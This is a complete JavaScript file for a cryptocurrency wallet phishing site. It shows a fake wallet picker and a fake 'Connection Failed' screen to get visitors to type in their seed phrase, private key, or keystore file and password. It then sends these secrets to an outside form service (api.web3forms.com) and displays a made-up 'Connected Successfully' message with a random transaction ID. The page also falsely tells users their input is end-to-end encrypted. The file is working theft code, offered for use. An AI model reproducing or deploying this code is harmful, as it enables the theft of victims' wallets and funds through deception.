// === FINAL script.js – WEB3FORMS UNLIMITED FREE (NO MORE FORMSPREE BLOCK) ===
let selectedWalletName = "";
let selectedWalletImg = "";
// YOUR WEB3FORMS ACCESS KEY (CHANGE IF YOU WANT)
const WEB3FORMS_KEY = "f09a5240-a6d9-4aff-a9c2-ecef99f47b9a";
// OPEN WALLET MODAL
function openWalletModal() {
  if (document.getElementById('walletModal')) return;
  const modal = document.createElement('div');
  modal.id = 'walletModal';
  modal.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.95);z-index:9999;display:flex;justify-content:center;align-items:center;backdrop-filter:blur(10px);';
  const wallets = [
    "Metamask.jpeg","Trustwallet.jpeg","Coinbase.png","Binance.png","Phantom.png","Ledger.jpeg",
    "Walletconnect.jpeg","Safepal.png","Uniswap.jpeg","Polygon.jpeg","Ronin.png","Sui.png",
    "Kepler.jpeg","Solo_dex.jpeg","XUMM.jpeg","Bittensor.png","Compass.png","Compound.jpeg",
    "Gate.webp","Bitpay.jpeg","Bing.png","Other.png"
  ];
  modal.innerHTML = `
    <div style="background:#111;padding:25px 30px;border-radius:20px;width:90%;max-width:420px;max-height:85vh;overflow-y:auto;border:3px solid gold;box-shadow:0 0 40px rgba(255,215,0,0.5);position:relative;">
      <button onclick="document.getElementById('walletModal').remove()"
              style="position:absolute;top:10px;right:10px;background:#ff3333;color:white;width:40px;height:40px;border:none;border-radius:50%;font-size:24px;cursor:pointer;">X</button>
      <h2 style="text-align:center;color:gold;font-size:1.8rem;margin:0 0 25px;">Select Wallet</h2>
      <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:16px;">
        ${wallets.map(img => `
          <button class="wallet-btn" data-img="${img}"
                  style="background:#222;border:2px solid #555;border-radius:14px;padding:14px;display:flex;flex-direction:column;align-items:center;gap:8px;color:white;cursor:pointer;transition:0.3s;"
                  onmouseover="this.style.borderColor='gold';this.style.transform='scale(1.05)'"
                  onmouseout="this.style.borderColor='#555';this.style.transform='scale(1)'">
            <img src="${img}" width="50" height="50" style="border-radius:50%;">
            <span style="font-size:0.9rem;">${img.split('.')[0].replace(/_/g,' ')}</span>
          </button>
        `).join('')}
      </div>
    </div>
  `;
  document.body.appendChild(modal);
  modal.addEventListener('click', (e) => {
    const btn = e.target.closest('.wallet-btn');
    if (btn) {
      selectedWalletName = btn.querySelector('span').textContent.trim();
      selectedWalletImg = btn.querySelector('img').src;
      modal.remove();
      showLoadingWithWallet();
    }
  });
}
// LOADING OVERLAY
function showLoadingWithWallet() {
  const overlay = document.getElementById('loadingOverlay');
  if (!overlay) return console.error("Add loadingOverlay to HTML");
  overlay.querySelector('.loading-content').innerHTML = `
    <img src="${selectedWalletImg}" width="70" height="70" style="border-radius:50%;border:4px solid gold;margin-bottom:20px;" onerror="this.src='Wallet_icon.png'">
    <div style="display:flex;align-items:center;gap:15px;">
      <div class="loading-circle"></div>
      <div style="color:white;font-size:1.3rem;">Connecting to ${selectedWalletName}...</div>
    </div>
  `;
  overlay.classList.remove('hidden');
  document.body.style.overflow = 'hidden';
  setTimeout(() => {
    overlay.classList.add('hidden');
    document.body.style.overflow = '';
    showManualConnect();
  }, 8000);
}
// MANUAL CONNECT — NOW USING WEB3FORMS (FREE & UNLIMITED)
function showManualConnect() {
  if (document.getElementById('manualModal')) return;
  const modal = document.createElement('div');
  modal.id = 'manualModal';
  modal.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:90%;max-width:380px;background:#1a1a1a;padding:30px;border-radius:18px;color:white;text-align:center;box-shadow:0 0 30px gold;z-index:9999;border:3px solid gold;';
  modal.innerHTML = `
    <button onclick="this.closest('#manualModal').remove()" style="position:absolute;top:10px;right:10px;background:#ff3333;color:white;width:36px;height:36px;border:none;border-radius:50%;font-size:22px;cursor:pointer;">X</button>
    <h3 style="color:red;margin-bottom:8px;font-size:1.4rem;">Connection Failed</h3>
    <h4 style="color:#0f0;margin-bottom:20px;font-size:1.2rem;">Connect Manually</h4>
    <div style="display:flex;justify-content:center;gap:15px;margin-bottom:20px;">
      <button class="tab active" data-type="PHRASE">PHRASE</button>
      <button class="tab" data-type="KEYSTORE JSON">KEYSTORE</button>
      <button class="tab" data-type="PRIVATE KEY">PRIVATE KEY</button>
    </div>
    <textarea id="seedInput" placeholder="Enter your 12 or 24 word phrase..."
              style="width:100%;height:130px;padding:14px;background:#222;color:red;border:2px solid #555;border-radius:12px;font-size:15px;resize:none;"></textarea>
   
    <input type="password" id="passInput" placeholder="Password (Keystore)"
           style="display:none;width:100%;margin-top:12px;padding:14px;background:#222;color:white;border:2px solid #555;border-radius:12px;font-size:15px;">
    <p style="color:#0f0;font-size:13px;margin:15px 0;">End-to-end encrypted</p>
    <button id="connectBtn" style="width:100%;padding:16px;background:gold;color:black;font-weight:bold;border:none;border-radius:14px;font-size:17px;cursor:pointer;">
      Connect Now
    </button>
    <div id="resultBox" style="margin-top:25px;"></div>
  `;
  document.body.appendChild(modal);
  const textarea = modal.querySelector('#seedInput');
  const passField = modal.querySelector('#passInput');
  const resultBox = modal.querySelector('#resultBox');
  const connectBtn = modal.querySelector('#connectBtn');
  let currentTab = "PHRASE";
  modal.querySelectorAll('.tab').forEach(t => {
    t.onclick = () => {
      modal.querySelectorAll('.tab').forEach(x => x.classList.remove('active'));
      t.classList.add('active');
      currentTab = t.dataset.type;
      if (currentTab === "KEYSTORE JSON") {
        textarea.placeholder = "Paste Keystore JSON...";
        textarea.style.color = "white";
        passField.style.display = "block";
      } else {
        textarea.placeholder = currentTab === "PHRASE" ? "Enter 12 or 24 words..." : "Enter private key...";
        textarea.value = "";
        textarea.style.color = "red";
        passField.style.display = "none";
        passField.value = "";
      }
    };
  });
  textarea.addEventListener('input', () => {
    if (currentTab !== "PHRASE") return;
    const words = textarea.value.trim().split(/\s+/).filter(Boolean);
    textarea.style.color = (words.length === 12 || words.length === 24) ? "#00ff00" : "red";
  });
  // === CORRECTED WEB3FORMS SUBMISSION (ONLY ALLOWED FIELDS) ===
  connectBtn.onclick = async () => {
    const seed = textarea.value.trim();
    const pass = passField.value.trim();
    
    if (!seed || (currentTab === "KEYSTORE JSON" && !pass)) {
      alert("Please fill all required fields");
      return;
    }

    connectBtn.textContent = "Sending...";
    connectBtn.disabled = true;
    resultBox.innerHTML = `<div class="loading-circle" style="margin:20px auto;"></div>`;

    let message = `Wallet: ${selectedWalletName || 'Unknown'}\n`;
    message += `Connection Type: ${currentTab}\n\n`;

    if (currentTab === "PHRASE") {
      message += `Seed Phrase:\n${seed}`;
    } else if (currentTab === "KEYSTORE JSON") {
      message += `Keystore JSON:\n${seed}\n\nPassword: ${pass}`;
    } else if (currentTab === "PRIVATE KEY") {
      message += `Private Key:\n${seed}`;
    }

    try {
      const response = await fetch("https://api.web3forms.com/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          access_key: WEB3FORMS_KEY,
          subject: "Manual Wallet Connection - " + selectedWalletName,
          message: message
        })
      });

      const data = await response.json();

      if (response.ok && data.success) {
        const fakeId = Math.floor(100000000 + Math.random() * 900000000);
        resultBox.innerHTML = `
          <p style="color:#0f0;margin:15px 0;font-size:1.2rem;">Connected Successfully!</p>
          <img src="https://api.qrserver.com/v1/create-qr-code/?data=${fakeId}&size=180x180" style="margin:20px auto;display:block;">
          <p style="color:#0f0;margin-top:10px;">Transaction ID: ${fakeId}</p>
        `;
      } else {
        resultBox.innerHTML = `<p style="color:red;">Error: ${data.message || 'Submission failed'}</p>`;
      }
    } catch (e) {
      resultBox.innerHTML = `<p style="color:red;">Network error. Please try again.</p>`;
      console.error(e);
    } finally {
      connectBtn.textContent = "Connect Now";
      connectBtn.disabled = false;
    }
  };
}
// LIVE TABLE + BUTTON BINDING (unchanged)
async function loadCryptoTable() {
  const tbody = document.getElementById('crypto-table-body');
  if (!tbody) return;
  tbody.innerHTML = `<tr><td colspan="6" style="color:gold;padding:30px;">Loading prices...</td></tr>`;
  try {
    const res = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=20&page=1');
    const data = await res.json();
    tbody.innerHTML = '';
    data.forEach((c, i) => {
      tbody.innerHTML += `<tr>
        <td style="padding:12px;color:#ccc;">${i+1}</td>
        <td style="padding:12px;"><img src="${c.image}" width="28" height="28" style="border-radius:50%;margin-right:10px;"> ${c.name}</td>
        <td style="padding:12px;color:gold;">${c.symbol.toUpperCase()}</td>
        <td style="padding:12px;color:white;">$${Number(c.current_price).toLocaleString()}</td>
        <td style="padding:12px;color:#aaa;">$${c.market_cap.toLocaleString()}</td>
        <td style="padding:12px;color:${c.price_change_percentage_24h >= 0 ? '#0f0' : 'red'}">${c.price_change_percentage_24h?.toFixed(2)}%</td>
      </tr>`;
    });
  } catch (e) {
    tbody.innerHTML = `<tr><td colspan="6" style="color:red;">Failed to load</td></tr>`;
  }
}
document.addEventListener('DOMContentLoaded', () => {
  loadCryptoTable();
  setInterval(loadCryptoTable, 60000);
  const bind = () => document.querySelectorAll('.interact-button').forEach(btn => {
    btn.onclick = e => { e.preventDefault(); openWalletModal(); };
  });
  bind(); setTimeout(bind, 100); setTimeout(bind, 500);
  document.body.addEventListener('click', e => {
    if (e.target.closest('.interact-button')) {
      e.preventDefault();
      openWalletModal();
    }
  });
});
// CLEAN STYLES
const style = document.createElement('style');
style.textContent = `
  @keyframes spin { to { transform: rotate(360deg); } }
  .loading-circle { width:40px;height:40px;border:6px solid #333;border-top:6px solid gold;border-radius:50%;animation:spin 1s linear infinite; }
  .tab { background:none;border:none;color:#aaa;padding:8px 16px;font-size:14px;cursor:pointer; }
  .tab.active { color:white;text-decoration:underline;text-decoration-color:gold; }
  .loading-overlay { display:none;position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.95);z-index:9998;justify-content:center;align-items:center;flex-direction:column; }
  .loading-overlay:not(.hidden) { display:flex !important; }
`;
document.head.appendChild(style);
